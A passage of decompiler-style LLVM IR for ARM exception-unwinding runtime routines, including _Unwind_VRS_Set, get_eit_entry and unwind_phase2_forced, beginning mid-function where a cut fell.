  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17c04
  %v6_17c08 = icmp eq i32 %representation, 0
  br i1 %v6_17c08, label %dec_label_pc_17c18, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17c04
  br label %dec_label_pc_17c40

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17c40

dec_label_pc_17c18:                               ; preds = %bb
  %v3_17c18 = mul i32 %regno, 4
  %v2_17c1c = add i32 %v3_17c18, %context
  %v1_17c20 = add i32 %v2_17c1c, 4
  %v2_17c20 = inttoptr i32 %v1_17c20 to i32*
  %v3_17c20 = load i32, i32* %v2_17c20, align 4
  %v2_17c2c = bitcast i8* %valuep to i32*
  store i32 %v3_17c20, i32* %v2_17c2c, align 4
  ret i32 0

dec_label_pc_17c34:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17c34
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17c34, %bb9
  %v0_17c3c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17c3c)
  br label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17c40, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17c48 = icmp eq i32 %regclass, 0
  br i1 %v2_17c48, label %dec_label_pc_17c50, label %dec_label_pc_17c80

dec_label_pc_17c50:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17c50
  %v6_17c54 = icmp eq i32 %representation, 0
  br i1 %v6_17c54, label %dec_label_pc_17c64, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17c50
  br label %dec_label_pc_17c8c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17c8c

dec_label_pc_17c64:                               ; preds = %bb
  %v3_17c68 = mul i32 %regno, 4
  %v1_17c6c = bitcast i8* %valuep to i32*
  %v2_17c6c = load i32, i32* %v1_17c6c, align 4
  %v2_17c70 = add i32 %v3_17c68, %context
  %v2_17c78 = add i32 %v2_17c70, 4
  %v3_17c78 = inttoptr i32 %v2_17c78 to i32*
  store i32 %v2_17c6c, i32* %v3_17c78, align 4
  ret i32 0

dec_label_pc_17c80:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17c80
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17c80, %bb9
  %v0_17c88 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17c88)
  br label %dec_label_pc_17c8c

dec_label_pc_17c8c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17c8c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_17c94 = add i32 %context, 68
  %v2_17c94 = inttoptr i32 %v1_17c94 to i32*
  %v3_17c94 = load i32, i32* %v2_17c94, align 4
  ret i32 %v3_17c94
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_17ca4 = add i32 %exc, 8
  %v2_17ca4 = inttoptr i32 %v1_17ca4 to i32*
  %v3_17ca4 = load i32, i32* %v2_17ca4, align 4
  %v2_17ca8 = icmp eq i32 %v3_17ca4, 0
  br i1 %v2_17ca8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_17cbc = xor i1 %v2_17ca8, true
  call void @__pseudo_cond_branch(i1 %v2_17cbc, i32 %v3_17ca4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17cd4 = call i32 @abort()
  ret i32 %v0_17cd4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17ce0 = call i32 @abort()
  ret i32 %v0_17ce0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_17ce4 = load i32, i32* @r4, align 4
  store i32 %v3_17ce4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_23010.748 to i32), i32* %r5.global-to-local, align 4
  %v4_17cf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 32) to i32*), align 4
  %v2_17cf8 = icmp eq i32 %v4_17cf4, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_17d04 = add i32 %return_address, -2
  store i32 %v1_17d04, i32* %r4.global-to-local, align 4
  br i1 %v2_17cf8, label %dec_label_pc_17d3c, label %dec_label_pc_17d0c

dec_label_pc_17d0c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_17cf4)
  %v2_17d1c = icmp eq i32 %v1_17d04, 0
  br i1 %v2_17d1c, label %.thread, label %dec_label_pc_17d5cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_17d0c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_17d24 = load i32, i32* %r6.global-to-local, align 4
  %v3_17d24 = add i32 %v2_17d24, 16
  %v4_17d24 = inttoptr i32 %v3_17d24 to i32*
  store i32 0, i32* %v4_17d24, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %.thread, %.thread10, %dec_label_pc_17d74, %dec_label_pc_17ed4, %dec_label_pc_17ec0, %dec_label_pc_17e9c, %dec_label_pc_17e74
  %v0_17d2c = load i32, i32* %r2.global-to-local, align 4
  %v2_17d34 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17d34, i32* @r4, align 4
  ret i32 %v0_17d2c

dec_label_pc_17d3c:                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  %v4_17d44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 12) to i32*), align 4
  %v4_17d48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 24) to i32*), align 4
  store i32 %v4_17d48, i32* %r2.global-to-local, align 4
  %v2_17d4c = sub i32 %v4_17d44, %v4_17d48
  %v3_17d50 = sdiv i32 %v2_17d4c, 8
  store i32 %v3_17d50, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17d5c

dec_label_pc_17d5cthread-pre-split:               ; preds = %dec_label_pc_17d0c
  %v3_17d5c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17d5c

dec_label_pc_17d5c:                               ; preds = %dec_label_pc_17d5cthread-pre-split, %dec_label_pc_17d3c
  %v0_17da0.pre = phi i32 [ %v1_17d04, %dec_label_pc_17d5cthread-pre-split ], [ %v4_17d48, %dec_label_pc_17d3c ]
  %v1_17d64 = phi i32 [ %v3_17d5c.pr, %dec_label_pc_17d5cthread-pre-split ], [ %v3_17d50, %dec_label_pc_17d3c ]
  %v2_17d60 = icmp eq i32 %v1_17d64, 0
  br i1 %v2_17d60, label %dec_label_pc_17d74, label %dec_label_pc_17d90.preheader

dec_label_pc_17d90.preheader:                     ; preds = %dec_label_pc_17d5c
  %v2_17d64 = add i32 %v1_17d64, -1
  %v1_17dc0 = add i32 %v0_17da0.pre, 8
  br label %dec_label_pc_17d90.outer

dec_label_pc_17d74.loopexit:                      ; preds = %dec_label_pc_17dec
  br label %dec_label_pc_17d74

dec_label_pc_17d74:                               ; preds = %dec_label_pc_17d74.loopexit, %dec_label_pc_17d5c, %dec_label_pc_17eb8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_17d7c = load i32, i32* %r6.global-to-local, align 4
  %v2_17d7c = add i32 %v1_17d7c, 16
  %v3_17d7c = inttoptr i32 %v2_17d7c to i32*
  store i32 0, i32* %v3_17d7c, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17de0
  %v3_17d84 = icmp ult i32 %storemerge40, %v0_17de4
  br i1 %v3_17d84, label %dec_label_pc_17d8c, label %dec_label_pc_17dfc

dec_label_pc_17d8c:                               ; preds = %dec_label_pc_17d84
  %v1_17d8c = add nsw i32 %v3_17d98, 1
  br label %dec_label_pc_17d90.outer

dec_label_pc_17d90.outer:                         ; preds = %dec_label_pc_17d8c, %dec_label_pc_17d90.preheader
  %v1_17dec.ph = phi i32 [ %v1_17d8c, %dec_label_pc_17d8c ], [ 0, %dec_label_pc_17d90.preheader ]
  %v0_17d90.ph = phi i32 [ %v0_17d90, %dec_label_pc_17d8c ], [ %v2_17d64, %dec_label_pc_17d90.preheader ]
  br label %dec_label_pc_17d90

dec_label_pc_17d90:                               ; preds = %dec_label_pc_17d90.outer, %dec_label_pc_17df4
  %v0_17d90 = phi i32 [ %v1_17df4, %dec_label_pc_17df4 ], [ %v0_17d90.ph, %dec_label_pc_17d90.outer ]
  %v2_17d90 = add i32 %v0_17d90, %v1_17dec.ph
  %tmp = icmp slt i32 %v2_17d90, 0
  %v4_17d94 = zext i1 %tmp to i32
  %v5_17d94 = add i32 %v4_17d94, %v2_17d90
  %v3_17d98 = sdiv i32 %v5_17d94, 2
  %v3_17d9c = mul i32 %v3_17d98, 8
  store i32 %v3_17d9c, i32* @ip, align 4
  %v2_17da0 = add i32 %v3_17d9c, %v0_17da0.pre
  %v3_17da0 = inttoptr i32 %v2_17da0 to i32*
  %v4_17da0 = load i32, i32* %v3_17da0, align 4
  %v1_17da4 = and i32 %v4_17da0, 1073741824
  %v2_17da4 = icmp eq i32 %v1_17da4, 0
  %v2_17da8 = or i32 %v4_17da0, -2147483648
  %tmp79 = bitcast i32 %v4_17da0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_17dac = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_17da4, i32 %v2_17dac, i32 %v2_17da8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_17db0 = icmp eq i32 %v2_17d64, %v3_17d98
  store i32 %v2_17da0, i32* %r7.global-to-local, align 4
  br i1 %v9_17db0, label %dec_label_pc_17de0, label %dec_label_pc_17dc0

dec_label_pc_17dc0:                               ; preds = %dec_label_pc_17d90
  %v2_17dc4 = add i32 %v3_17d9c, %v1_17dc0
  %v3_17dc4 = inttoptr i32 %v2_17dc4 to i32*
  %v4_17dc4 = load i32, i32* %v3_17dc4, align 4
  %v1_17dcc = and i32 %v4_17dc4, 1073741824
  %v2_17dcc = icmp eq i32 %v1_17dcc, 0
  %v2_17dd0 = or i32 %v4_17dc4, -2147483648
  %tmp81 = bitcast i32 %v4_17dc4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_17dd4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_17dcc, i32 %v2_17dd4, i32 %v2_17dd0
  %v1_17dd8 = add i32 %v2_17dc4, -1
  %v2_17ddc = add i32 %storemerge39, %v1_17dd8
  br label %dec_label_pc_17de0

dec_label_pc_17de0:                               ; preds = %dec_label_pc_17d90, %dec_label_pc_17dc0
  %storemerge40 = phi i32 [ %v2_17ddc, %dec_label_pc_17dc0 ], [ -1, %dec_label_pc_17d90 ]
  %v2_17de0 = add i32 %storemerge, %v2_17da0
  %v0_17de4 = load i32, i32* %r4.global-to-local, align 4
  %v3_17de4 = icmp ult i32 %v0_17de4, %v2_17de0
  br i1 %v3_17de4, label %dec_label_pc_17dec, label %dec_label_pc_17d84

dec_label_pc_17dec:                               ; preds = %dec_label_pc_17de0
  %v9_17dec = icmp eq i32 %v3_17d98, %v1_17dec.ph
  br i1 %v9_17dec, label %dec_label_pc_17d74.loopexit, label %dec_label_pc_17df4

dec_label_pc_17df4:                               ; preds = %dec_label_pc_17dec
  %v1_17df4 = add nsw i32 %v3_17d98, -1
  br label %dec_label_pc_17d90

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17d84
  %v2_17dfc = load i32, i32* %v3_17da0, align 4
  %v1_17e00 = and i32 %v2_17dfc, 1073741824
  %v2_17e00 = icmp eq i32 %v1_17e00, 0
  %v2_17e04 = or i32 %v2_17dfc, -2147483648
  %tmp83 = bitcast i32 %v2_17dfc to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_17e08 = bitcast float %tmp84 to i32
  %v0_17e0c = select i1 %v2_17e00, i32 %v2_17e08, i32 %v2_17e04
  %v2_17e0c = add i32 %v0_17e0c, %v2_17da0
  %v1_17e10 = load i32, i32* %r6.global-to-local, align 4
  %v2_17e10 = add i32 %v1_17e10, 72
  %v3_17e10 = inttoptr i32 %v2_17e10 to i32*
  store i32 %v2_17e0c, i32* %v3_17e10, align 4
  %v0_17e14 = load i32, i32* %r7.global-to-local, align 4
  %v1_17e14 = add i32 %v0_17e14, 4
  %v2_17e14 = inttoptr i32 %v1_17e14 to i32*
  %v3_17e14 = load i32, i32* %v2_17e14, align 4
  %v7_17e18 = icmp eq i32 %v3_17e14, 1
  br i1 %v7_17e18, label %.thread10, label %dec_label_pc_17e2c

.thread10:                                        ; preds = %dec_label_pc_17dfc
  %v1_17e18 = add i32 %v3_17e14, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_17e24 = load i32, i32* %r6.global-to-local, align 4
  %v3_17e24 = add i32 %v2_17e24, 16
  %v4_17e24 = inttoptr i32 %v3_17e24 to i32*
  store i32 %v1_17e18, i32* %v4_17e24, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17e2c:                               ; preds = %dec_label_pc_17dfc
  %v1_17e2c = icmp slt i32 %v3_17e14, 0
  br i1 %v1_17e2c, label %.thread38, label %dec_label_pc_17e44

.thread38:                                        ; preds = %dec_label_pc_17e2c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_17e38 = load i32, i32* %r6.global-to-local, align 4
  %v5_17e38 = add i32 %v4_17e38, 76
  %v6_17e38 = inttoptr i32 %v5_17e38 to i32*
  store i32 %v1_17e14, i32* %v6_17e38, align 4
  %v3_17e3c = load i32, i32* %r2.global-to-local, align 4
  %v4_17e3c = load i32, i32* %r6.global-to-local, align 4
  %v5_17e3c = add i32 %v4_17e3c, 80
  %v6_17e3c = inttoptr i32 %v5_17e3c to i32*
  store i32 %v3_17e3c, i32* %v6_17e3c, align 4
  br label %dec_label_pc_17e64

dec_label_pc_17e44:                               ; preds = %dec_label_pc_17e2c
  %v1_17e44 = and i32 %v3_17e14, 1073741824
  %v2_17e44 = icmp eq i32 %v1_17e44, 0
  %v2_17e48 = or i32 %v3_17e14, -2147483648
  %tmp85 = bitcast i32 %v3_17e14 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_17e4c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_17e44, i32 %v2_17e4c, i32 %v2_17e48
  %v1_17e50 = add i32 %storemerge42, 4
  %v2_17e54 = add i32 %v1_17e50, %v0_17e14
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17e5c = load i32, i32* %r6.global-to-local, align 4
  %v2_17e5c = add i32 %v1_17e5c, 76
  %v3_17e5c = inttoptr i32 %v2_17e5c to i32*
  store i32 %v2_17e54, i32* %v3_17e5c, align 4
  %v0_17e60 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e60 = load i32, i32* %r6.global-to-local, align 4
  %v2_17e60 = add i32 %v1_17e60, 80
  %v3_17e60 = inttoptr i32 %v2_17e60 to i32*
  store i32 %v0_17e60, i32* %v3_17e60, align 4
  br label %dec_label_pc_17e64

dec_label_pc_17e64:                               ; preds = %.thread38, %dec_label_pc_17e44
  %v0_17e64 = load i32, i32* %r6.global-to-local, align 4
  %v1_17e64 = add i32 %v0_17e64, 76
  %v2_17e64 = inttoptr i32 %v1_17e64 to i32*
  %v3_17e64 = load i32, i32* %v2_17e64, align 4
  store i32 %v3_17e64, i32* %r2.global-to-local, align 4
  %v1_17e68 = inttoptr i32 %v3_17e64 to i32*
  %v2_17e68 = load i32, i32* %v1_17e68, align 4
  %v1_17e6c = icmp slt i32 %v2_17e68, 0
  br i1 %v1_17e6c, label %dec_label_pc_17e90, label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %dec_label_pc_17e64
  %v1_17e74 = and i32 %v2_17e68, 1073741824
  %v2_17e74 = icmp eq i32 %v1_17e74, 0
  %v2_17e78 = or i32 %v2_17e68, -2147483648
  %tmp87 = bitcast i32 %v2_17e68 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_17e7c = bitcast float %tmp88 to i32
  %v0_17e80 = select i1 %v2_17e74, i32 %v2_17e7c, i32 %v2_17e78
  %v2_17e80 = add i32 %v0_17e80, %v3_17e64
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17e88 = add i32 %v0_17e64, 16
  %v3_17e88 = inttoptr i32 %v2_17e88 to i32*
  store i32 %v2_17e80, i32* %v3_17e88, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17e90:                               ; preds = %dec_label_pc_17e64
  %v3_17e90 = udiv i32 %v2_17e68, 16777216
  %v1_17e94 = urem i32 %v3_17e90, 16
  %v2_17e94 = icmp eq i32 %v1_17e94, 0
  br i1 %v2_17e94, label %dec_label_pc_17e9c, label %dec_label_pc_17eb0

dec_label_pc_17e9c:                               ; preds = %dec_label_pc_17e90
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17ea4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ea4 = add i32 %v0_17ea4, -42848
  %v2_17ea8 = add i32 %v0_17e64, 16
  %v3_17ea8 = inttoptr i32 %v2_17ea8 to i32*
  store i32 %v2_17ea4, i32* %v3_17ea8, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17e90
  %v7_17eb0 = icmp eq i32 %v1_17e94, 1
  br i1 %v7_17eb0, label %dec_label_pc_17ed4, label %dec_label_pc_17eb8

dec_label_pc_17eb8:                               ; preds = %dec_label_pc_17eb0
  %v7_17eb8 = icmp eq i32 %v1_17e94, 2
  br i1 %v7_17eb8, label %dec_label_pc_17ec0, label %dec_label_pc_17d74

dec_label_pc_17ec0:                               ; preds = %dec_label_pc_17eb8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17ec8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ec8 = add i32 %v0_17ec8, -42864
  %v2_17ecc = add i32 %v0_17e64, 16
  %v3_17ecc = inttoptr i32 %v2_17ecc to i32*
  store i32 %v2_17ec8, i32* %v3_17ecc, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17eb0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17edc = load i32, i32* %r5.global-to-local, align 4
  %v2_17edc = add i32 %v0_17edc, -42856
  %v2_17ee0 = add i32 %v0_17e64, 16
  %v3_17ee0 = inttoptr i32 %v2_17ee0 to i32*
  store i32 %v2_17edc, i32* %v3_17ee0, align 4
  br label %dec_label_pc_17d2c

; uselistorder directives
  uselistorder i32 %v1_17e94, { 2, 1, 0 }
  uselistorder i32 %v0_17e64, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_17e14, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17de4, { 1, 0 }
  uselistorder i32 %v3_17d9c, { 2, 1, 0 }
  uselistorder i32 %v3_17d98, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_17d90, { 1, 0 }
  uselistorder i32 %v0_17d90, { 1, 0 }
  uselistorder i32 %v2_17d64, { 1, 0 }
  uselistorder i32 %v0_17da0.pre, { 1, 0 }
  uselistorder i32 %v3_17d50, { 1, 0 }
  uselistorder i32 %v1_17d04, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1, 9 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 1, 2, 3, 14, 4 }
  uselistorder label %dec_label_pc_17e64, { 1, 0 }
  uselistorder label %dec_label_pc_17de0, { 1, 0 }
  uselistorder label %dec_label_pc_17d90, { 1, 0 }
  uselistorder label %dec_label_pc_17d74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d2c, { 3, 4, 5, 6, 1, 2, 0 }
}

define i32 @function_17eec(i32 %arg1) local_unnamed_addr {
dec_label_pc_17eec:
  %v0_17eec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17eec, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17eec
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17eec, %bb
  %v10_17ef4 = phi i32 [ %arg1, %dec_label_pc_17eec ], [ 0, %bb ]
  ret i32 %v10_17ef4

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %v1_17f08 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v2_17f18 = ptrtoint i32* %stack_var_-340 to i32
  store i32 %v2_17f18, i32* @r8, align 4
  %v1_17f1c = inttoptr i32 %v1_17f08 to i32*
  %v2_17f1c = load i32, i32* %v1_17f1c, align 4
  store i32 %v2_17f1c, i32* %r0.global-to-local, align 4
  %v12_17f1c = add i32 %entry_vrs, 20
  store i32 %v2_17f1c, i32* %stack_var_-340, align 4
  %v1_17f28 = inttoptr i32 %v12_17f1c to i32*
  %v2_17f28 = load i32, i32* %v1_17f28, align 4
  store i32 %v2_17f28, i32* %r0.global-to-local, align 4
  %v12_17f28 = add i32 %entry_vrs, 36
  %v1_17f30 = inttoptr i32 %v12_17f28 to i32*
  %v2_17f30 = load i32, i32* %v1_17f30, align 4
  store i32 %v2_17f30, i32* %r0.global-to-local, align 4
  %v12_17f30 = add i32 %entry_vrs, 52
  store i32 %v12_17f30, i32* @ip, align 4
  %v13_17f34 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_17f34, i32* @lr, align 4
  %v1_17f38 = inttoptr i32 %v12_17f30 to i32*
  %v2_17f38 = load i32, i32* %v1_17f38, align 4
  store i32 %v2_17f38, i32* %r0.global-to-local, align 4
  %v9_17f38 = add i32 %entry_vrs, 64
  %v10_17f38 = inttoptr i32 %v9_17f38 to i32*
  %v11_17f38 = load i32, i32* %v10_17f38, align 4
  store i32 0, i32* @r4, align 4
  %v1_17f40 = add i32 %ucbp, 12
  %v2_17f40 = inttoptr i32 %v1_17f40 to i32*
  %v3_17f40 = load i32, i32* %v2_17f40, align 4
  store i32 %v3_17f40, i32* @sb, align 4
  %v1_17f44 = add i32 %ucbp, 24
  %v2_17f44 = inttoptr i32 %v1_17f44 to i32*
  %v3_17f44 = load i32, i32* %v2_17f44, align 4
  store i32 %v3_17f44, i32* @sl, align 4
  store i32 %v2_17f38, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_17f58 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17f38)
  store i32 %v2_17f58, i32* %r0.global-to-local, align 4
  %v0_17f5c = load i32, i32* @r6, align 4
  %v1_17f5c = load i32, i32* @r4, align 4
  %v9_17f5c = icmp eq i32 %v0_17f5c, %v1_17f5c
  store i32 %v2_17f58, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_17f5c, label %dec_label_pc_17f70, label %.thread

.thread:                                          ; preds = %entry
  store i32 %.pre, i32* @fp, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17f70:                               ; preds = %entry
  store i32 %v0_17f5c, i32* @r4, align 4
  store i32 %.pre, i32* @fp, align 4
  br label %dec_label_pc_17f78

dec_label_pc_17f78:                               ; preds = %dec_label_pc_18040, %dec_label_pc_17f70
  br label %dec_label_pc_17f7c

dec_label_pc_17f7c:                               ; preds = %.thread, %dec_label_pc_17f78
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_17f78 ]
  %v1_17f84 = phi i32 [ 26, %.thread ], [ 25, %dec_label_pc_17f78 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_17f7c = icmp eq i32 %v2_17f58, 0
  br i1 %v2_17f7c, label %dec_label_pc_17ff4, label %.thread2.dec_label_pc_17f90_crit_edge

.thread2.dec_label_pc_17f90_crit_edge:            ; preds = %dec_label_pc_17f7c
  store i32 %v1_17f84, i32* @r6, align 4
  br label %dec_label_pc_17f90

dec_label_pc_17f90:                               ; preds = %.thread2.dec_label_pc_17f90_crit_edge, %dec_label_pc_17ff4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_17fa0 = load i32, i32* @r5, align 4
  store i32 %v0_17fa0, i32* @r3, align 4
  store i32 98224, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_17f40)
  br i1 false, label %dec_label_pc_17fb8, label %dec_label_pc_17fe0

dec_label_pc_17fb8:                               ; preds = %dec_label_pc_17f90
  br i1 undef, label %dec_label_pc_17fc0, label %dec_label_pc_17fe4

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fb8
  br i1 undef, label %dec_label_pc_18040, label %dec_label_pc_17fd8

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fc0
  br i1 undef, label %dec_label_pc_18038, label %dec_label_pc_17fe0

dec_label_pc_17fe0:                               ; preds = %dec_label_pc_17f90, %dec_label_pc_17fd8
  br label %dec_label_pc_17fe4

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17fb8, %dec_label_pc_17fe0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17f7c
  store i32 %v11_17f38, i32* @r3, align 4
  %v2_17ff8 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_17ff8, i32* @r4, align 4
  %v1_17ffc = load i32, i32* @r5, align 4
  %v2_17ffc = add i32 %v1_17ffc, 20
  %v3_17ffc = inttoptr i32 %v2_17ffc to i32*
  store i32 %v11_17f38, i32* %v3_17ffc, align 4
  store i32 %v2_17ff8, i32* %r0.global-to-local, align 4
  %v3_1800c = bitcast i32* %next_vrs_-648 to i16*
  %v4_1800c = call i32 @memcpy(i16* %v3_1800c, i32 %.pre, i32 304)
  %v0_18014 = load i32, i32* @r6, align 4
  store i32 %v0_18014, i32* %r0.global-to-local, align 4
  %v0_18018 = load i32, i32* @r5, align 4
  %v1_1801c = add i32 %v0_18018, 16
  %v2_1801c = inttoptr i32 %v1_1801c to i32*
  %v3_1801c = load i32, i32* %v2_1801c, align 4
  store i32 %v3_1801c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1801c)
  %v0_1802c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1802c, i32* @r4, align 4
  br label %dec_label_pc_17f90

dec_label_pc_18038:                               ; preds = %dec_label_pc_17fd8
  br label %dec_label_pc_18040

dec_label_pc_18040:                               ; preds = %dec_label_pc_17fc0, %dec_label_pc_18038
  br label %dec_label_pc_17f78

; uselistorder directives
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v11_17f38, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 11, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 36, 0, 26, 27, 28, 7, 8, 9, 38, 10, 11, 12, 25, 13, 32, 33, 2, 37, 14, 15, 16, 17, 18, 19, 20, 21, 29, 30, 31, 23, 1, 24, 3, 4, 5, 22, 6, 34, 35 }
